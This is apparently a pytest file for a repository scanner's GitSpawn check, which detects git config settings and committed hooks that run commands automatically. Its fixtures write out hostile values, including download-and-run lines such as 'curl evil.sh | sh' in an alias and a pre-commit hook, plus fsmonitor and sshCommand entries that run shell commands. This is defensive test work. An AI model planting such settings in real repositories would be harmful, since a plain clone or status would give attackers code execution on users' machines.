"""Tests for git-config autorun detection (GitSpawn class) — src/scanner/scan.py.

A repo that ships a `.git/config` or `.gitconfig` setting core.fsmonitor (or
hooksPath / sshCommand / a `!`-shell alias) to a command turns a plain `git status`
or `clone` into remote code execution. These lock the detection + its file selection.
"""
from __future__ import annotations

from src.scanner.scan import (
    _is_git_config_file,
    _is_git_hook_file,
    _scan_git_autorun,
    _scan_git_hooks,
    _should_skip_path,
)


def _sev(findings, name_substr):
    for f in findings:
        if name_substr in f.name:
            return f.severity
    return None


def test_git_config_files_are_selected_and_not_skipped():
    for p in (".git/config", ".gitconfig", "gitconfig", "sub/.git/config"):
        assert _is_git_config_file(p) is True, p
        assert _should_skip_path(p) is False, p  # never skipped despite .git/ in SKIP_DIRS


def test_non_git_config_and_git_internals():
    # a plain `config` file elsewhere is NOT a git config
    assert _is_git_config_file("src/config") is False
    # other .git internals stay skipped
    assert _should_skip_path(".git/objects/ab/cdef") is True
    assert _should_skip_path(".git/HEAD") is True


def test_fsmonitor_command_is_high():
    findings = _scan_git_autorun("[core]\n\tfsmonitor = /tmp/pwn.sh\n", ".git/config")
    assert _sev(findings, "core.fsmonitor") == "high"


def test_fsmonitor_true_is_not_flagged():
    # the built-in monitor (fsmonitor=true) is legitimate — must not flag
    findings = _scan_git_autorun("[core]\n\tfsmonitor = true\n", ".git/config")
    assert findings == []


def test_hookspath_and_sshcommand_are_high():
    cfg = "[core]\n\thooksPath = ./evil\n\tsshCommand = curl x|sh\n"
    findings = _scan_git_autorun(cfg, ".git/config")
    assert _sev(findings, "core.hooksPath") == "high"
    assert _sev(findings, "core.sshCommand") == "high"


def test_editor_vim_is_benign_but_shell_editor_is_high():
    assert _scan_git_autorun("[core]\n\teditor = vim\n", ".gitconfig") == []
    assert _scan_git_autorun("[core]\n\tpager = less\n", ".gitconfig") == []
    findings = _scan_git_autorun("[core]\n\teditor = sh -c 'id'\n", ".gitconfig")
    assert _sev(findings, "core.editor") == "high"


def test_download_execute_alias_is_high():
    findings = _scan_git_autorun("[alias]\n\tx = !curl evil.sh | sh\n", ".gitconfig")
    assert _sev(findings, "git alias 'x'") == "high"


def test_benign_shell_aliases_are_not_flagged():
    # `!`-aliases are ubiquitous and mostly benign — plain and function-style must NOT flag
    cfg = (
        "[alias]\n"
        "\td = !git diff\n"
        "\tst = status\n"
        '\tcredit = "!f() { git commit --amend --author \\"$1 <$2>\\" -C HEAD; }; f"\n'
        "\tlg = log --oneline --graph\n"
    )
    assert _scan_git_autorun(cfg, ".gitconfig") == []


def test_include_path_is_not_flagged():
    # includes are common in legit dotfiles ([include] path = ~/.gitconfig.local) — no flag
    assert _scan_git_autorun('[includeIf "gitdir:~/"]\n\tpath = ~/.local\n', ".git/config") == []


def test_non_git_config_file_yields_nothing():
    # even with dangerous content, a non-git-config path is not parsed
    assert _scan_git_autorun("[core]\n\tfsmonitor = /tmp/x\n", "src/config") == []


def test_findings_carry_category_and_remediation():
    f = _scan_git_autorun("[core]\n\tfsmonitor = /tmp/x\n", ".git/config")[0]
    assert f.category == "git_autorun"
    assert f.remediation and "GitSpawn" in f.remediation


# --- committed .git/hooks/* (Part A) ---

def test_git_hook_selection():
    for p in (".git/hooks/pre-commit", "sub/.git/hooks/post-checkout", ".git/hooks/pre-push"):
        assert _is_git_hook_file(p) is True, p
        assert _should_skip_path(p) is False, p  # not skipped despite .git/


def test_git_hook_non_hooks_and_samples_ignored():
    assert _is_git_hook_file(".git/hooks/pre-commit.sample") is False  # git's default template
    assert _is_git_hook_file(".git/hooks/not-a-real-hook") is False    # unknown name
    assert _is_git_hook_file("hooks/pre-commit") is False              # not under .git/
    assert _is_git_hook_file("src/pre-commit") is False
    assert _should_skip_path(".git/hooks/pre-commit.sample") is True   # sample stays skipped


def test_committed_hook_flagged_high():
    f = _scan_git_hooks("#!/bin/sh\ncurl evil.sh | sh\n", ".git/hooks/pre-commit")
    assert len(f) == 1 and f[0].severity == "high" and f[0].category == "git_autorun"
    assert "pre-commit" in f[0].name


def test_empty_hook_and_non_hook_yield_nothing():
    assert _scan_git_hooks("", ".git/hooks/pre-commit") == []       # empty file
    assert _scan_git_hooks("echo hi", "scripts/deploy.sh") == []    # not a git hook path
